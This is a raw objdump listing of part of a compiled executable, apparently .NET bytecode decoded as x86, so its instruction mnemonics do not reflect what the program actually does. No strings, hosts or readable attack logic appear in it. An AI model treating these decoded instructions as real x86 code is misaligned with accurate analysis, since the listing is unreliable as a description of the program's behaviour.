  4036ca:	00 0a                	add    %cl,(%edx)
  4036cc:	00 00                	add    %al,(%eax)
  4036ce:	00 00                	add    %al,(%eax)
  4036d0:	02 00                	add    (%eax),%al
  4036d2:	3f                   	aas
  4036d3:	00 5f 9e             	add    %bl,-0x62(%edi)
  4036d6:	00 0a                	add    %cl,(%edx)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 00                	add    %al,(%eax)
  4036dc:	02 00                	add    (%eax),%al
  4036de:	38 00                	cmp    %al,(%eax)
  4036e0:	72 aa                	jb     0x40368c
  4036e2:	00 0a                	add    %cl,(%edx)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	00 00                	add    %al,(%eax)
  4036ea:	02 00                	add    (%eax),%al
  4036ec:	c0 c2 00             	rol    $0x0,%dl
  4036ef:	03 13                	add    (%ebx),%edx
  4036f1:	00 00                	add    %al,(%eax)
  4036f3:	01 02                	add    %eax,(%edx)
  4036f5:	00 02                	add    %al,(%edx)
  4036f7:	00 c3                	add    %al,%bl
  4036f9:	c5 00                	lds    (%eax),%eax
  4036fb:	0a 00                	or     (%eax),%al
  4036fd:	00 00                	add    %al,(%eax)
  4036ff:	00 1b                	add    %bl,(%ebx)
  403701:	30 03                	xor    %al,(%ebx)
  403703:	00 87 00 00 00 1a    	add    %al,0x1a000000(%edi)
  403709:	00 00                	add    %al,(%eax)
  40370b:	11 72 20             	adc    %esi,0x20(%edx)
  40370e:	02 00                	add    (%eax),%al
  403710:	70 72                	jo     0x403784
  403712:	59                   	pop    %ecx
  403713:	0a 00                	or     (%eax),%al
  403715:	70 02                	jo     0x403719
  403717:	28 68 00             	sub    %ch,0x0(%eax)
  40371a:	00 0a                	add    %cl,(%edx)
  40371c:	73 ac                	jae    0x4036ca
  40371e:	00 00                	add    %al,(%eax)
  403720:	0a 25 17 6f 69 00    	or     0x696f17,%ah
  403726:	00 0a                	add    %cl,(%edx)
  403728:	25 17 6f ad 00       	and    $0xad6f17,%eax
  40372d:	00 0a                	add    %cl,(%edx)
  40372f:	25 16 6f 1f 00       	and    $0x1f6f16,%eax
  403734:	00 0a                	add    %cl,(%edx)
  403736:	25 17 6f 1e 00       	and    $0x1e6f17,%eax
  40373b:	00 0a                	add    %cl,(%edx)
  40373d:	28 20                	sub    %ah,(%eax)
  40373f:	00 00                	add    %al,(%eax)
  403741:	0a 0a                	or     (%edx),%cl
  403743:	06                   	push   %es
  403744:	6f                   	outsl  %ds:(%esi),(%dx)
  403745:	6b 00 00             	imul   $0x0,(%eax),%eax
  403748:	0a 6f 6c             	or     0x6c(%edi),%ch
  40374b:	00 00                	add    %al,(%eax)
  40374d:	0a 0b                	or     (%ebx),%cl
  40374f:	06                   	push   %es
  403750:	6f                   	outsl  %ds:(%esi),(%dx)
  403751:	ae                   	scas   %es:(%edi),%al
  403752:	00 00                	add    %al,(%eax)
  403754:	0a 6f 6c             	or     0x6c(%edi),%ch
  403757:	00 00                	add    %al,(%eax)
  403759:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40375c:	6f                   	outsl  %ds:(%esi),(%dx)
  40375d:	6d                   	insl   (%dx),%es:(%edi)
  40375e:	00 00                	add    %al,(%eax)
  403760:	0a 08                	or     (%eax),%cl
  403762:	28 a8 00 00 0a 2d    	sub    %ch,0x2d0a0000(%eax)
  403768:	04 08                	add    $0x8,%al
  40376a:	0d de 24 07 0d       	or     $0xd0724de,%eax
  40376f:	de 20                	fisubs (%eax)
  403771:	06                   	push   %es
  403772:	2c 06                	sub    $0x6,%al
  403774:	06                   	push   %es
  403775:	6f                   	outsl  %ds:(%esi),(%dx)
  403776:	70 00                	jo     0x403778
  403778:	00 0a                	add    %cl,(%edx)
  40377a:	dc 13                	fcoml  (%ebx)
  40377c:	04 72                	add    $0x72,%al
  40377e:	61                   	popa
  40377f:	0a 00                	or     (%eax),%al
  403781:	70 11                	jo     0x403794
  403783:	04 6f                	add    $0x6f,%al
  403785:	6e                   	outsb  %ds:(%esi),(%dx)
  403786:	00 00                	add    %al,(%eax)
  403788:	0a 28                	or     (%eax),%ch
  40378a:	68 00 00 0a 0d       	push   $0xd0a0000
  40378f:	de 00                	fiadds (%eax)
  403791:	09 2a                	or     %ebp,(%edx)
  403793:	00 01                	add    %al,(%ecx)
  403795:	1c 00                	sbb    $0x0,%al
  403797:	00 02                	add    %al,(%edx)
  403799:	00 37                	add    %dh,(%edi)
  40379b:	00 2e                	add    %ch,(%esi)
  40379d:	65 00 0a             	add    %cl,%gs:(%edx)
	...
  4037a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4037a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4037aa:	00 16                	add    %dl,(%esi)
  4037ac:	1a 00                	sbb    (%eax),%al
  4037ae:	00 01                	add    %al,(%ecx)
  4037b0:	1b 30                	sbb    (%eax),%esi
  4037b2:	05 00 83 00 00       	add    $0x8300,%eax
  4037b7:	00 1b                	add    %bl,(%ebx)
  4037b9:	00 00                	add    %al,(%eax)
  4037bb:	11 28                	adc    %ebp,(%eax)
  4037bd:	af                   	scas   %es:(%edi),%eax
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	b0 00                	mov    $0x0,%al
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	b1 00                	mov    $0x0,%cl
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	0a 16                	or     (%esi),%dl
  4037cd:	0b 2b                	or     (%ebx),%ebp
  4037cf:	5f                   	pop    %edi
  4037d0:	06                   	push   %es
  4037d1:	07                   	pop    %es
  4037d2:	9a 0c 08 6f b2 00 00 	lcall  $0x0,$0xb26f080c
  4037d9:	0a 18                	or     (%eax),%bl
  4037db:	33 4e 08             	xor    0x8(%esi),%ecx
  4037de:	6f                   	outsl  %ds:(%esi),(%dx)
  4037df:	7f 00                	jg     0x4037e1
  4037e1:	00 0a                	add    %cl,(%edx)
  4037e3:	17                   	pop    %ss
  4037e4:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  4037e8:	01 25 16 1f 2e 9d    	add    %esp,0x9d2e1f16
  4037ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ef:	b3 00                	mov    $0x0,%bl
  4037f1:	00 0a                	add    %cl,(%edx)
  4037f3:	0d 09 8e 69 1a       	or     $0x1a698e09,%eax
  4037f8:	33 31                	xor    (%ecx),%esi
  4037fa:	1b 8d 57 00 00 01    	sbb    0x1000057(%ebp),%ecx
  403800:	25 16 09 16 9a       	and    $0x9a160916,%eax
  403805:	a2 25 17 72 2c       	mov    %al,0x2c721725
  40380a:	13 00                	adc    (%eax),%eax
  40380c:	70 a2                	jo     0x4037b0
  40380e:	25 18 09 17 9a       	and    $0x9a170918,%eax
  403813:	a2 25 19 72 2c       	mov    %al,0x2c721925
  403818:	13 00                	adc    (%eax),%eax
  40381a:	70 a2                	jo     0x4037be
  40381c:	25 1a 09 18 9a       	and    $0x9a18091a,%eax
  403821:	a2 28 8f 00 00       	mov    %al,0x8f28
  403826:	0a 13                	or     (%ebx),%dl
  403828:	04 de                	add    $0xde,%al
  40382a:	11 07                	adc    %eax,(%edi)
  40382c:	17                   	pop    %ss
  40382d:	58                   	pop    %eax
  40382e:	0b 07                	or     (%edi),%eax
  403830:	06                   	push   %es
  403831:	8e 69 32             	mov    0x32(%ecx),%gs
  403834:	9b de 03             	fiadds (%ebx)
  403837:	26 de 00             	fiadds %es:(%eax)
  40383a:	14 2a                	adc    $0x2a,%al
  40383c:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  40383f:	00 01                	add    %al,(%ecx)
  403841:	10 00                	adc    %al,(%eax)
  403843:	00 00                	add    %al,(%eax)
  403845:	00 00                	add    %al,(%eax)
  403847:	00 7b 7b             	add    %bh,0x7b(%ebx)
  40384a:	00 03                	add    %al,(%ebx)
  40384c:	13 00                	adc    (%eax),%eax
  40384e:	00 01                	add    %al,(%ecx)
  403850:	1b 30                	sbb    (%eax),%esi
  403852:	03 00                	add    (%eax),%eax
  403854:	36 00 00             	add    %al,%ss:(%eax)
  403857:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40385a:	00 11                	add    %dl,(%ecx)
  40385c:	73 b4                	jae    0x403812
  40385e:	00 00                	add    %al,(%eax)
  403860:	0a 0a                	or     (%edx),%cl
  403862:	06                   	push   %es
  403863:	02 20                	add    (%eax),%ah
  403865:	f4                   	hlt
  403866:	01 00                	add    %eax,(%eax)
  403868:	00 6f b5             	add    %ch,-0x4b(%edi)
  40386b:	00 00                	add    %al,(%eax)
  40386d:	0a 0b                	or     (%ebx),%cl
  40386f:	07                   	pop    %es
  403870:	2c 0b                	sub    $0xb,%al
  403872:	07                   	pop    %es
  403873:	6f                   	outsl  %ds:(%esi),(%dx)
  403874:	b6 00                	mov    $0x0,%dh
  403876:	00 0a                	add    %cl,(%edx)
  403878:	16                   	push   %ss
  403879:	fe 01                	incb   (%ecx)
  40387b:	2b 01                	sub    (%ecx),%eax
  40387d:	16                   	push   %ss
  40387e:	0c de                	or     $0xde,%al
  403880:	0f 06                	clts
  403882:	2c 06                	sub    $0x6,%al
  403884:	06                   	push   %es
  403885:	6f                   	outsl  %ds:(%esi),(%dx)
  403886:	70 00                	jo     0x403888
  403888:	00 0a                	add    %cl,(%edx)
  40388a:	dc 26                	fsubl  (%esi)
  40388c:	de 00                	fiadds (%eax)
  40388e:	16                   	push   %ss
  40388f:	2a 08                	sub    (%eax),%cl
  403891:	2a 00                	sub    (%eax),%al
  403893:	00 01                	add    %al,(%ecx)
  403895:	1c 00                	sbb    $0x0,%al
  403897:	00 02                	add    %al,(%edx)
  403899:	00 06                	add    %al,(%esi)
  40389b:	00 1f                	add    %bl,(%edi)
  40389d:	25 00 0a 00 00       	and    $0xa00,%eax
  4038a2:	00 00                	add    %al,(%eax)
  4038a4:	00 00                	add    %al,(%eax)
  4038a6:	00 00                	add    %al,(%eax)
  4038a8:	2f                   	das
  4038a9:	2f                   	das
  4038aa:	00 03                	add    %al,(%ebx)
  4038ac:	13 00                	adc    (%eax),%eax
  4038ae:	00 01                	add    %al,(%ecx)
  4038b0:	1b 30                	sbb    (%eax),%esi
  4038b2:	03 00                	add    (%eax),%eax
  4038b4:	33 00                	xor    (%eax),%eax
  4038b6:	00 00                	add    %al,(%eax)
  4038b8:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  4038bd:	b7 00                	mov    $0x0,%bh
  4038bf:	00 0a                	add    %cl,(%edx)
  4038c1:	0a 06                	or     (%esi),%al
  4038c3:	02 03                	add    (%ebx),%al
  4038c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4038c6:	b8 00 00 0a 04       	mov    $0x40a0000,%eax
  4038cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4038cc:	b9 00 00 0a 2c       	mov    $0x2c0a0000,%ecx
  4038d1:	08 06                	or     %al,(%esi)
  4038d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4038d4:	ba 00 00 0a 2b       	mov    $0x2b0a0000,%edx
  4038d9:	01 16                	add    %edx,(%esi)
  4038db:	0b de                	or     %esi,%ebx
  4038dd:	0f 06                	clts
  4038df:	2c 06                	sub    $0x6,%al
  4038e1:	06                   	push   %es
  4038e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4038e3:	70 00                	jo     0x4038e5
  4038e5:	00 0a                	add    %cl,(%edx)
  4038e7:	dc 26                	fsubl  (%esi)
  4038e9:	16                   	push   %ss
  4038ea:	0b de                	or     %esi,%ebx
  4038ec:	00 07                	add    %al,(%edi)
  4038ee:	2a 00                	sub    (%eax),%al
  4038f0:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4038f3:	00 02                	add    %al,(%edx)
  4038f5:	00 06                	add    %al,(%esi)
  4038f7:	00 1c 22             	add    %bl,(%edx,%eiz,1)
  4038fa:	00 0a                	add    %cl,(%edx)
	...
  403904:	2c 2c                	sub    $0x2c,%al
  403906:	00 05 13 00 00 01    	add    %al,0x1000013
  40390c:	1b 30                	sbb    (%eax),%esi
  40390e:	02 00                	add    (%eax),%al
  403910:	46                   	inc    %esi
  403911:	00 00                	add    %al,(%eax)
  403913:	00 1e                	add    %bl,(%esi)
  403915:	00 00                	add    %al,(%eax)
  403917:	11 02                	adc    %eax,(%edx)
  403919:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40391c:	00 0a                	add    %cl,(%edx)
  40391e:	2d 04 16 0b de       	sub    $0xde0b1604,%eax
  403923:	38 02                	cmp    %al,(%edx)
  403925:	28 bb 00 00 0a 0a    	sub    %bh,0xa0a0000(%ebx)
  40392b:	28 3b                	sub    %bh,(%ebx)
  40392d:	00 00                	add    %al,(%eax)
  40392f:	0a 06                	or     (%esi),%al
  403931:	28 bc 00 00 0a 0c 12 	sub    %bh,0x120c0a00(%eax,%eax,1)
  403938:	02 28                	add    (%eax),%ch
  40393a:	bd 00 00 0a 23       	mov    $0x230a0000,%ebp
  40393f:	00 00                	add    %al,(%eax)
  403941:	00 00                	add    %al,(%eax)
  403943:	00 00                	add    %al,(%eax)
  403945:	38 40 36             	cmp    %al,0x36(%eax)
  403948:	0a 02                	or     (%edx),%al
  40394a:	28 30                	sub    %dh,(%eax)
  40394c:	00 00                	add    %al,(%eax)
  40394e:	0a 16                	or     (%esi),%dl
  403950:	0b de                	or     %esi,%ebx
  403952:	09 17                	or     %edx,(%edi)
  403954:	0b de                	or     %esi,%ebx
  403956:	05 26 16 0b de       	add    $0xde0b1626,%eax
  40395b:	00 07                	add    %al,(%edi)
  40395d:	2a 00                	sub    (%eax),%al
  40395f:	00 01                	add    %al,(%ecx)
  403961:	10 00                	adc    %al,(%eax)
  403963:	00 00                	add    %al,(%eax)
  403965:	00 00                	add    %al,(%eax)
  403967:	00 3f                	add    %bh,(%edi)
  403969:	3f                   	aas
  40396a:	00 05 13 00 00 01    	add    %al,0x1000013
  403970:	13 30                	adc    (%eax),%esi
  403972:	02 00                	add    (%eax),%al
  403974:	3f                   	aas
  403975:	00 00                	add    %al,(%eax)
  403977:	00 1f                	add    %bl,(%edi)
  403979:	00 00                	add    %al,(%eax)
  40397b:	11 12                	adc    %edx,(%edx)
  40397d:	00 28                	add    %ch,(%eax)
  40397f:	94                   	xchg   %eax,%esp
  403980:	00 00                	add    %al,(%eax)
  403982:	0a 7d 3e             	or     0x3e(%ebp),%bh
  403985:	00 00                	add    %al,(%eax)
  403987:	04 12                	add    $0x12,%al
  403989:	00 02                	add    %al,(%edx)
  40398b:	7d 3f                	jge    0x4039cc
  40398d:	00 00                	add    %al,(%eax)
  40398f:	04 12                	add    $0x12,%al
  403991:	00 03                	add    %al,(%ebx)
  403993:	7d 40                	jge    0x4039d5
  403995:	00 00                	add    %al,(%eax)
  403997:	04 12                	add    $0x12,%al
  403999:	00 15 7d 3d 00 00    	add    %dl,0x3d7d
  40399f:	04 12                	add    $0x12,%al
  4039a1:	00 7c 3e 00          	add    %bh,0x0(%esi,%edi,1)
  4039a5:	00 04 12             	add    %al,(%edx,%edx,1)
  4039a8:	00 28                	add    %ch,(%eax)
  4039aa:	04 00                	add    $0x0,%al
  4039ac:	00 2b                	add    %ch,(%ebx)
  4039ae:	12 00                	adc    (%eax),%al
  4039b0:	7c 3e                	jl     0x4039f0
  4039b2:	00 00                	add    %al,(%eax)
  4039b4:	04 28                	add    $0x28,%al
  4039b6:	96                   	xchg   %eax,%esi
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 2a                	or     (%edx),%ch
  4039bb:	2e 7e 13             	jle,pn 0x4039d1
  4039be:	00 00                	add    %al,(%eax)
  4039c0:	04 6f                	add    $0x6f,%al
  4039c2:	be 00 00 0a 2a       	mov    $0x2a0a0000,%esi
  4039c7:	00 13                	add    %dl,(%ebx)
  4039c9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4039cc:	94                   	xchg   %eax,%esp
  4039cd:	00 00                	add    %al,(%eax)
  4039cf:	00 00                	add    %al,(%eax)
  4039d1:	00 00                	add    %al,(%eax)
  4039d3:	00 73 3f             	add    %dh,0x3f(%ebx)
  4039d6:	00 00                	add    %al,(%eax)
  4039d8:	0a 80 0f 00 00 04    	or     0x400000f(%eax),%al
  4039de:	1f                   	pop    %ds
  4039df:	09 8d 57 00 00 01    	or     %ecx,0x1000057(%ebp)
  4039e5:	25 16 72 30 13       	and    $0x13307216,%eax
  4039ea:	00 70 a2             	add    %dh,-0x5e(%eax)
  4039ed:	25 17 72 36 13       	and    $0x13367217,%eax
  4039f2:	00 70 a2             	add    %dh,-0x5e(%eax)
  4039f5:	25 18 72 44 13       	and    $0x13447218,%eax
  4039fa:	00 70 a2             	add    %dh,-0x5e(%eax)
  4039fd:	25 19 72 50 13       	and    $0x13507219,%eax
  403a02:	00 70 a2             	add    %dh,-0x5e(%eax)
  403a05:	25 1a 72 5e 13       	and    $0x135e721a,%eax
  403a0a:	00 70 a2             	add    %dh,-0x5e(%eax)
  403a0d:	25 1b 72 72 13       	and    $0x1372721b,%eax
  403a12:	00 70 a2             	add    %dh,-0x5e(%eax)
  403a15:	25 1c 72 86 13       	and    $0x1386721c,%eax
  403a1a:	00 70 a2             	add    %dh,-0x5e(%eax)
  403a1d:	25 1d 72 94 13       	and    $0x1394721d,%eax
  403a22:	00 70 a2             	add    %dh,-0x5e(%eax)
  403a25:	25 1e 72 9e 13       	and    $0x139e721e,%eax
  403a2a:	00 70 a2             	add    %dh,-0x5e(%eax)
  403a2d:	80 10 00             	adcb   $0x0,(%eax)
  403a30:	00 04 73             	add    %al,(%ebx,%esi,2)
  403a33:	bf 00 00 0a 80       	mov    $0x800a0000,%edi
  403a38:	13 00                	adc    (%eax),%eax
  403a3a:	00 04 72             	add    %al,(%edx,%esi,2)
  403a3d:	a8 13                	test   $0x13,%al
  403a3f:	00 70 80             	add    %dh,-0x80(%eax)
  403a42:	14 00                	adc    $0x0,%al
  403a44:	00 04 72             	add    %al,(%edx,%esi,2)
  403a47:	ec                   	in     (%dx),%al
  403a48:	13 00                	adc    (%eax),%eax
  403a4a:	70 80                	jo     0x4039cc
  403a4c:	15 00 00 04 1f       	adc    $0x1f040000,%eax
  403a51:	7a 8d                	jp     0x4039e0
  403a53:	4b                   	dec    %ebx
  403a54:	00 00                	add    %al,(%eax)
  403a56:	01 25 d0 24 00 00    	add    %esp,0x24d0
  403a5c:	04 28                	add    $0x28,%al
  403a5e:	22 00                	and    (%eax),%al
  403a60:	00 0a                	add    %cl,(%edx)
  403a62:	80 16 00             	adcb   $0x0,(%esi)
  403a65:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403a68:	c6                   	(bad)
  403a69:	7e 43                	jle    0x403aae
  403a6b:	00 00                	add    %al,(%eax)
  403a6d:	04 25                	add    $0x25,%al
  403a6f:	2d 17 26 7e 42       	sub    $0x427e2617,%eax
  403a74:	00 00                	add    %al,(%eax)
  403a76:	04 fe                	add    $0xfe,%al
  403a78:	06                   	push   %es
  403a79:	76 00                	jbe    0x403a7b
  403a7b:	00 06                	add    %al,(%esi)
  403a7d:	73 35                	jae    0x403ab4
  403a7f:	00 00                	add    %al,(%eax)
  403a81:	0a 25 80 43 00 00    	or     0x4380,%ah
  403a87:	04 73                	add    $0x73,%al
  403a89:	36 00 00             	add    %al,%ss:(%eax)
  403a8c:	0a 25 17 6f 37 00    	or     0x376f17,%ah
  403a92:	00 0a                	add    %cl,(%edx)
  403a94:	6f                   	outsl  %ds:(%esi),(%dx)
  403a95:	38 00                	cmp    %al,(%eax)
  403a97:	00 0a                	add    %cl,(%edx)
  403a99:	2a 00                	sub    (%eax),%al
  403a9b:	00 13                	add    %dl,(%ebx)
  403a9d:	30 05 00 53 00 00    	xor    %al,0x5300
  403aa3:	00 20                	add    %ah,(%eax)
  403aa5:	00 00                	add    %al,(%eax)
  403aa7:	11 7e 19             	adc    %edi,0x19(%esi)
  403aaa:	00 00                	add    %al,(%eax)
  403aac:	04 1e                	add    $0x1e,%al
  403aae:	1f                   	pop    %ds
  403aaf:	0d 6f 39 00 00       	or     $0x396f,%eax
  403ab4:	0a 0a                	or     (%edx),%cl
  403ab6:	06                   	push   %es
  403ab7:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  403abb:	01 0b                	add    %ecx,(%ebx)
  403abd:	16                   	push   %ss
  403abe:	0c 2b                	or     $0x2b,%al
  403ac0:	25 07 08 72 06       	and    $0x6720807,%eax
  403ac5:	14 00                	adc    $0x0,%al
  403ac7:	70 7e                	jo     0x403b47
  403ac9:	19 00                	sbb    %eax,(%eax)
  403acb:	00 04 72             	add    %al,(%edx,%esi,2)
  403ace:	06                   	push   %es
  403acf:	14 00                	adc    $0x0,%al
  403ad1:	70 28                	jo     0x403afb
  403ad3:	41                   	inc    %ecx
  403ad4:	00 00                	add    %al,(%eax)
  403ad6:	0a 6f c0             	or     -0x40(%edi),%ch
  403ad9:	00 00                	add    %al,(%eax)
  403adb:	0a 28                	or     (%eax),%ch
  403add:	c1 00 00             	roll   $0x0,(%eax)
  403ae0:	0a 9d 08 17 58 0c    	or     0xc581708(%ebp),%bl
  403ae6:	08 06                	or     %al,(%esi)
  403ae8:	32 d7                	xor    %bh,%dl
  403aea:	07                   	pop    %es
  403aeb:	73 c2                	jae    0x403aaf
  403aed:	00 00                	add    %al,(%eax)
  403aef:	0a 72 50             	or     0x50(%edx),%dh
  403af2:	14 00                	adc    $0x0,%al
  403af4:	70 28                	jo     0x403b1e
  403af6:	68 00 00 0a 2a       	push   $0x2a0a0000
  403afb:	00 1b                	add    %bl,(%ebx)
  403afd:	30 02                	xor    %al,(%edx)
  403aff:	00 2c 00             	add    %ch,(%eax,%eax,1)
  403b02:	00 00                	add    %al,(%eax)
  403b04:	15 00 00 11 28       	adc    $0x28110000,%eax
  403b09:	31 00                	xor    %eax,(%eax)
  403b0b:	00 0a                	add    %cl,(%edx)
  403b0d:	6f                   	outsl  %ds:(%esi),(%dx)
  403b0e:	32 00                	xor    (%eax),%al
  403b10:	00 0a                	add    %cl,(%edx)
  403b12:	6f                   	outsl  %ds:(%esi),(%dx)
  403b13:	33 00                	xor    (%eax),%eax
  403b15:	00 0a                	add    %cl,(%edx)
  403b17:	0a 02                	or     (%edx),%al
  403b19:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403b1c:	00 0a                	add    %cl,(%edx)
  403b1e:	2d 07 06 02 28       	sub    $0x28020607,%eax
  403b23:	c3                   	ret
  403b24:	00 00                	add    %al,(%eax)
  403b26:	0a 02                	or     (%edx),%al
  403b28:	1d 28 c4 00 00       	sbb    $0xc428,%eax
  403b2d:	0a de                	or     %dh,%bl
  403b2f:	03 26                	add    (%esi),%esp
  403b31:	de 00                	fiadds (%eax)
  403b33:	2a 01                	sub    (%ecx),%al
  403b35:	10 00                	adc    %al,(%eax)
  403b37:	00 00                	add    %al,(%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 28                	add    %ch,(%eax)
  403b3d:	28 00                	sub    %al,(%eax)
  403b3f:	03 13                	add    (%ebx),%edx
  403b41:	00 00                	add    %al,(%eax)
  403b43:	01 1b                	add    %ebx,(%ebx)
  403b45:	30 03                	xor    %al,(%ebx)
  403b47:	00 32                	add    %dh,(%edx)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 22                	add    %ah,(%edx)
  403b4d:	00 00                	add    %al,(%eax)
  403b4f:	11 7e 26             	adc    %edi,0x26(%esi)
  403b52:	00 00                	add    %al,(%eax)
  403b54:	0a 72 43             	or     0x43(%edx),%dh
  403b57:	05 00 70 17 6f       	add    $0x6f177000,%eax
  403b5c:	27                   	daa
  403b5d:	00 00                	add    %al,(%eax)
  403b5f:	0a 0a                	or     (%edx),%cl
  403b61:	06                   	push   %es
  403b62:	2c 0c                	sub    $0xc,%al
  403b64:	06                   	push   %es
  403b65:	7e 18                	jle    0x403b7f
  403b67:	00 00                	add    %al,(%eax)
  403b69:	04 02                	add    $0x2,%al
  403b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  403b6c:	6f                   	outsl  %ds:(%esi),(%dx)
  403b6d:	00 00                	add    %al,(%eax)
  403b6f:	0a de                	or     %dh,%bl
  403b71:	0a 06                	or     (%esi),%al
  403b73:	2c 06                	sub    $0x6,%al
  403b75:	06                   	push   %es
  403b76:	6f                   	outsl  %ds:(%esi),(%dx)
  403b77:	70 00                	jo     0x403b79
  403b79:	00 0a                	add    %cl,(%edx)
  403b7b:	dc de                	(bad)
  403b7d:	03 26                	add    (%esi),%esp
  403b7f:	de 00                	fiadds (%eax)
  403b81:	2a 00                	sub    (%eax),%al
  403b83:	00 01                	add    %al,(%ecx)
  403b85:	1c 00                	sbb    $0x0,%al
  403b87:	00 02                	add    %al,(%edx)
  403b89:	00 11                	add    %dl,(%ecx)
  403b8b:	00 11                	add    %dl,(%ecx)
  403b8d:	22 00                	and    (%eax),%al
  403b8f:	0a 00                	or     (%eax),%al
  403b91:	00 00                	add    %al,(%eax)
  403b93:	00 00                	add    %al,(%eax)
  403b95:	00 00                	add    %al,(%eax)
  403b97:	00 2e                	add    %ch,(%esi)
  403b99:	2e 00 03             	add    %al,%cs:(%ebx)
  403b9c:	13 00                	adc    (%eax),%eax
  403b9e:	00 01                	add    %al,(%ecx)
  403ba0:	1b 30                	sbb    (%eax),%esi
  403ba2:	04 00                	add    $0x0,%al
  403ba4:	68 00 00 00 23       	push   $0x23000000
  403ba9:	00 00                	add    %al,(%eax)
  403bab:	11 72 5a             	adc    %esi,0x5a(%edx)
  403bae:	14 00                	adc    $0x0,%al
  403bb0:	70 0a                	jo     0x403bbc
  403bb2:	1b 8d 57 00 00 01    	sbb    0x1000057(%ebp),%ecx
  403bb8:	25 16 72 84 14       	and    $0x14847216,%eax
  403bbd:	00 70 a2             	add    %dh,-0x5e(%eax)
  403bc0:	25 17 06 a2 25       	and    $0x25a20617,%eax
  403bc5:	18 72 d0             	sbb    %dh,-0x30(%edx)
  403bc8:	14 00                	adc    $0x0,%al
  403bca:	70 a2                	jo     0x403b6e
  403bcc:	25 19 02 a2 25       	and    $0x25a20219,%eax
  403bd1:	1a 72 e0             	sbb    -0x20(%edx),%dh
  403bd4:	14 00                	adc    $0x0,%al
  403bd6:	70 a2                	jo     0x403b7a
  403bd8:	28 8f 00 00 0a 0b    	sub    %cl,0xb0a0000(%edi)
  403bde:	72 ea                	jb     0x403bca
  403be0:	14 00                	adc    $0x0,%al
  403be2:	70 07                	jo     0x403beb
  403be4:	73 ac                	jae    0x403b92
  403be6:	00 00                	add    %al,(%eax)
  403be8:	0a 25 17 6f 1e 00    	or     0x1e6f17,%ah
  403bee:	00 0a                	add    %cl,(%edx)
  403bf0:	25 16 6f 1f 00       	and    $0x1f6f16,%eax
  403bf5:	00 0a                	add    %cl,(%edx)
  403bf7:	25 17 6f 71 00       	and    $0x716f17,%eax
  403bfc:	00 0a                	add    %cl,(%edx)
  403bfe:	28 20                	sub    %ah,(%eax)
  403c00:	00 00                	add    %al,(%eax)
  403c02:	0a 25 2d 03 26 2b    	or     0x2b26032d,%ah
  403c08:	05 28 6d 00 00       	add    $0x6d28,%eax
  403c0d:	0a de                	or     %dh,%bl
  403c0f:	03 26                	add    (%esi),%esp
  403c11:	de 00                	fiadds (%eax)
  403c13:	2a 01                	sub    (%ecx),%al
  403c15:	10 00                	adc    %al,(%eax)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	00 00                	add    %al,(%eax)
  403c1b:	00 64 64 00          	add    %ah,0x0(%esp,%eiz,2)
  403c1f:	03 13                	add    (%ebx),%edx
  403c21:	00 00                	add    %al,(%eax)
  403c23:	01 1b                	add    %ebx,(%ebx)
  403c25:	30 03                	xor    %al,(%ebx)
  403c27:	00 72 00             	add    %dh,0x0(%edx)
  403c2a:	00 00                	add    %al,(%eax)
  403c2c:	24 00                	and    $0x0,%al
  403c2e:	00 11                	add    %dl,(%ecx)
  403c30:	28 31                	sub    %dh,(%ecx)
  403c32:	00 00                	add    %al,(%eax)
  403c34:	0a 6f 32             	or     0x32(%edi),%ch
  403c37:	00 00                	add    %al,(%eax)
  403c39:	0a 6f 33             	or     0x33(%edi),%ch
  403c3c:	00 00                	add    %al,(%eax)
  403c3e:	0a 0a                	or     (%edx),%cl
  403c40:	7e 17                	jle    0x403c59
  403c42:	00 00                	add    %al,(%eax)
  403c44:	04 0b                	add    $0xb,%al
  403c46:	16                   	push   %ss
  403c47:	0c 2b                	or     $0x2b,%al
  403c49:	4c                   	dec    %esp
  403c4a:	07                   	pop    %es
  403c4b:	08 9a 72 04 15 00    	or     %bl,0x150472(%edx)
  403c51:	70 28                	jo     0x403c7b
  403c53:	c5 00                	lds    (%eax),%eax
  403c55:	00 0a                	add    %cl,(%edx)
  403c57:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  403c5c:	2e 09 11             	or     %edx,%cs:(%ecx)
  403c5f:	04 9a                	add    $0x9a,%al
  403c61:	13 05 11 05 02 1b    	adc    0x1b020511,%eax
  403c67:	6f                   	outsl  %ds:(%esi),(%dx)
  403c68:	c6 00 00             	movb   $0x0,(%eax)
  403c6b:	0a 2d 17 11 05 06    	or     0x6051117,%ch
  403c71:	1b 6f c6             	sbb    -0x3a(%edi),%ebp
  403c74:	00 00                	add    %al,(%eax)
  403c76:	0a 2d 0c 11 05 28    	or     0x2805110c,%ch
  403c7c:	30 00                	xor    %al,(%eax)
  403c7e:	00 0a                	add    %cl,(%edx)
  403c80:	de 03                	fiadds (%ebx)
  403c82:	26 de 00             	fiadds %es:(%eax)
  403c85:	11 04 17             	adc    %eax,(%edi,%edx,1)
  403c88:	58                   	pop    %eax
